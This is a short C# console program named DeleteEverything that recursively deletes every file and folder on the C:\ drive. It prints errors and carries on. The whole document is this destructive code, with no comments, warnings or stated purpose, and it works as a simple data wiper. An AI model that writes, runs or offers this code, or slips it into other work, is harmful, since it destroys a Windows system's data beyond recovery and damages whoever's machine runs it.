using System;
using System.IO;

class DeleteEverything
{
    static void Main()
    {
        string drivePath = @"C:\";
        DeleteFilesAndDirectories(drivePath);
    }

    static void DeleteFilesAndDirectories(string path)
    {
        try
        {
            foreach (string file in Directory.GetFiles(path))
            {
                File.Delete(file);
            }

            foreach (string dir in Directory.GetDirectories(path))
            {
                DeleteFilesAndDirectories(dir);
                Directory.Delete(dir);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error deleting {path}: {ex.Message}");
        }
    }
}
